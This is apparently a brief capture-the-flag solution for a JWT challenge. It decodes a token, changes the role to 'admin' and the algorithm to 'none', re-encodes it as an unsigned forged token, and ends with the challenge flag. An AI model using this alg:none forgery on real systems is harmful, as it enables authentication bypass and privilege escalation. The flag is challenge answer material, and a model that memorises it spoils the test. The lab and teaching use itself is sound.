eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjo2NDkwNywidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NjA4OTcyfQ.vWfLSgcFjGiHDq976O3UBDTVdzeafjn8YkAC429K0XA
  -> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjo2NDkwNywidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NjA4OTcyfQ
    -> base64 decode
      ->  {"typ":"JWT","alg":"HS256"}
          {"auth":64907,"text":"I do love a good puzzle.","role":"user","iat":1607608972}
            -> modify role -> "admin"
            -> modify alg  -> "none"

{"typ":"JWT","alg":"none"}
  -> base64 encode 
    -> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
{"auth":64907,"text":"I do love a good puzzle.","role":"admin","iat":1607608972}
  -> base64 encode
    -> eyJhdXRoIjo2NDkwNywidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzYwODk3Mn0

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjo2NDkwNywidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzYwODk3Mn0.
Hey Santa, the flag is NOVI{Jw7_f@ilure_in_n0ne}.
